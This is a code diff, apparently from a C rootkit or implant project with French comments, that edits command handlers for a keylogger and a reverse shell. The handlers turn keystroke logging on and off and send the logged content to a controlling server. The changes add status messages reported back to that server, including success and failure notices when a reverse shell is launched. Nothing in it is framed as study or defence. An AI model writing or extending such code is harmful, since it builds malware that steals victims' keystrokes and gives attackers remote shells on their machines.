@@ -258,6 +258,7 @@ static int klgon_handler(char *args) {
     int ret_code = epikeylog_init(0);
     if (ret_code < 0) {
         ERR_MSG("klgon_handler: failed to activate keylogger\n");
+        send_to_server("");
         return ret_code;
     }
     send_to_server("keylogger activated\n");
@@ -269,10 +270,11 @@ static int klgoff_handler(char *args) {
     int ret_code = epikeylog_exit();
     if (ret_code < 0) {
         ERR_MSG("klgoff_handler: failed to deactivate keylogger\n");
+        send_to_server("");
         return ret_code;
     }
-    send_to_server("keylogger deactivated\n");
-    DBG_MSG("klgoff_handler: keylogger deactivated\n");
+    send_to_server("keylogger desactivated\n");
+    DBG_MSG("klgoff_handler: keylogger desactivated\n");
     return ret_code;
 }
 
@@ -280,6 +282,7 @@ static int klg_handler(char *args) {
     int ret_code = epikeylog_send_to_server();
     if (ret_code < 0) {
         ERR_MSG("klg_handler: failed to send keylogger content\n");
+        send_to_server("");
         return ret_code;
     }
     DBG_MSG("klg_handler: keylogger content sent\n");
@@ -305,8 +308,13 @@ static int getshell_handler(char *args) {
     // Lancer le reverse shell avec le port spécifié
     int ret_code = launch_reverse_shell(args);
 
-    if (ret_code < 0)
+    if (ret_code < 0){
         ERR_MSG("getshell_handler: failed to launch reverse shell on port %ld\n", shellport);
+        send_to_server("Failed to launch reverse shell\n");
+    }
+
+    else
+        send_to_server("Reverse shell launched successfully on port %ld\n", shellport);
 
     return ret_code;
 }
